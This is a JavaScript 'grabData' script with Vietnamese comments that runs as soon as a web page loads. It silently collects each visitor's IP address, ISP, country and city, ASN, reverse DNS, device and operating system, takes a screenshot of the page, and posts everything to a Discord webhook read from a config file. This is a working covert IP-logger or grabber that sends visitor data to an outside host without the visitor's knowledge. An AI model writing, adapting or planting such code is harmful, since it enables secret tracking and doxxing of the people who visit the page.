const grabData = async () => {
    try {
        console.log("Bắt đầu grabData...");

        // Lấy config từ file JSON
        const configResponse = await fetch("./config.json");
        if (!configResponse.ok) {
            throw new Error("Không tải được config.json: " + configResponse.status);
        }
        const config = await configResponse.json();
        const webhookUrl = config.Token;
        const apiKey = config.key;
        console.log("Config OK:", { hasWebhook: !!webhookUrl, hasKey: !!apiKey });

        if (!webhookUrl || !apiKey) {
            throw new Error("Thiếu Token hoặc key trong config.json");
        }

        // Gọi API lấy dữ liệu IP và user-agent
        const geoResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`);
        const userResponse = await fetch(`https://api.ipgeolocation.io/user-agent?apiKey=${apiKey}`);
        if (!geoResponse.ok || !userResponse.ok) {
            throw new Error("Lỗi gọi API: " + geoResponse.status + "/" + userResponse.status);
        }

        const geoData = await geoResponse.json();
        const agentData = await userResponse.json();
        console.log("API data OK");

        // Hàm helper lấy giá trị an toàn
        const safeGet = (obj, path, fallback = "N/A") => {
            return path.split('.').reduce((o, p) => (o && o[p] !== undefined) ? o[p] : fallback, obj);
        };

        // Trích xuất dữ liệu địa lý (không dùng lat/lon)
        const ip = geoData.ip || "Unknown";
        const isp = safeGet(geoData, 'isp') || "Unknown";
        const country = safeGet(geoData, 'country_name', "Unknown");
        const city = safeGet(geoData, 'city', "Unknown");
        const asNumber = safeGet(geoData, 'asn') || "Unknown";
        const asnName = safeGet(geoData, 'organization') || "Unknown";
        const reverseDNS = safeGet(geoData, 'reverse') || "Unknown";
        const regionCode = (safeGet(geoData, 'country_code2') || "").toLowerCase();
        const flag = safeGet(geoData, 'country_flag') || "https://via.placeholder.com/64?text=Flag";

        // Phát hiện VPN nâng cao
        const isVPN = asnName.toLowerCase().includes("worldstream") || 
                     isp.toLowerCase().includes("vpn") || 
                     reverseDNS.toLowerCase().includes("vpn") || 
                     asNumber.startsWith("AS") && !["AS3352", "AS12345"].includes(asNumber); // Ví dụ kiểm tra ASN
        const isMobile = safeGet(geoData, 'mobile', false);
        const isHosting = !isMobile && !isVPN;
        const isProxy = false;

        // Trích xuất dữ liệu thiết bị và hệ điều hành từ user-agent
        const deviceType = safeGet(agentData, 'device.type', 'Unknown');
        const deviceName = deviceType === 'mobile' ? 'Điện thoại' :
                         deviceType === 'tablet' ? 'Máy tính bảng' :
                         deviceType === 'desktop' ? 'Máy tính để bàn' : 'Không xác định';
        const customDeviceName = "Hien";
        const osName = safeGet(agentData, 'operatingSystem.name', 'Không xác định');
        const osVersion = safeGet(agentData, 'operatingSystem.versionMajor', '?');
        const osInfo = `${osName} ${osVersion}`;

        // Tự load html2canvas từ CDN và chụp screenshot
        let screenshotBlob = null;
        let hasScreenshot = false;
        try {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.async = true;
            await new Promise((resolve, reject) => {
                script.onload = async () => {
                    console.log("html2canvas loaded thành công!");
                    try {
                        const canvas = await html2canvas(document.body, {
                            scale: 1,
                            useCORS: true,
                            allowTaint: true,
                            backgroundColor: '#ffffff'
                        });
                        await new Promise((blobResolve) => {
                            canvas.toBlob((blob) => {
                                screenshotBlob = blob;
                                hasScreenshot = true;
                                console.log("Chụp screenshot trang thành công");
                                blobResolve();
                            }, 'image/png');
                        });
                        resolve();
                    } catch (captureError) {
                        console.warn("Lỗi chụp screenshot:", captureError);
                        reject(captureError);
                    }
                };
                script.onerror = () => reject(new Error("Không load được html2canvas"));
                document.head.appendChild(script);
            });
        } catch (screenshotError) {
            console.warn("Không thể chụp screenshot:", screenshotError.message);
            hasScreenshot = false;
        }

        // Tạo payload Discord với thông tin mở rộng
        const params = {
            username: `Truy cập từ ${country}/${city}`,
            avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
            content: "Log mới! 🌐",
            embeds: [
                {
                    title: `🌐 Địa chỉ IP: ${ip}`,
                    url: `https://whatismyipaddress.com/ip/${ip}`,
                    description: "Log lượt truy cập website",
                    thumbnail: { url: flag },
                    color: isVPN ? 16711680 : 1993898, // Màu đỏ nếu có VPN, xanh nếu không
                    fields: [
                        {
                            name: "📞 ISP",
                            value: isp,
                            inline: true
                        },
                        {
                            name: `:flag_${regionCode}: Quốc gia & Thành phố`,
                            value: `${country}/${city}`,
                            inline: true
                        },
                        {
                            name: "🌐 AS Number",
                            value: asNumber,
                            inline: true
                        },
                        {
                            name: "🌐 ASN Name",
                            value: asnName,
                            inline: true
                        },
                        {
                            name: "🔍 Reverse DNS",
                            value: reverseDNS,
                            inline: true
                        },
                        {
                            name: "📱 Mobile",
                            value: isMobile ? "True" : "False",
                            inline: true
                        },
                        {
                            name: "🏠 Hosting",
                            value: isHosting ? "True" : "False",
                            inline: true
                        },
                        {
                            name: "🔒 Proxy",
                            value: isProxy ? "True" : "False",
                            inline: true
                        },
                        {
                            name: "🔐 VPN",
                            value: isVPN ? "True" : "False",
                            inline: true
                        },
                        {
                            name: "🖥️ Thiết bị",
                            value: `${deviceName}--`,
                            inline: true
                        },
                        {
                            name: "💻 Hệ điều hành",
                            value: osInfo,
                            inline: true
                        },
                        {
                            name: "📸 Screenshot",
                            value: hasScreenshot ? "Đã chụp trang web (xem attachment)" : "Không thể chụp",
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Thời gian: ${new Date().toISOString()}`,
                        icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png"
                    }
                }
            ]
        };

        // Gửi lên Discord
        console.log("Gửi payload...");
        const formData = new FormData();
        if (screenshotBlob) formData.append('file1', screenshotBlob, 'page-screenshot.png');
        formData.append('payload_json', JSON.stringify(params));
        const response = await fetch(webhookUrl, { method: "POST", body: formData });

        const errorText = await response.text();
        console.log("Response full:", { status: response.status, body: errorText });

        if (response.ok) {
            console.log("Gửi thành công! 🎉");
        } else {
            console.error("Lỗi gửi chi tiết:", response.status, errorText);
            throw new Error(`HTTP ${response.status}: ${errorText}`);
        }
    } catch (error) {
        console.error("Lỗi trong grabData:", error.message);
    }
};

// Chạy lần đầu
grabData();
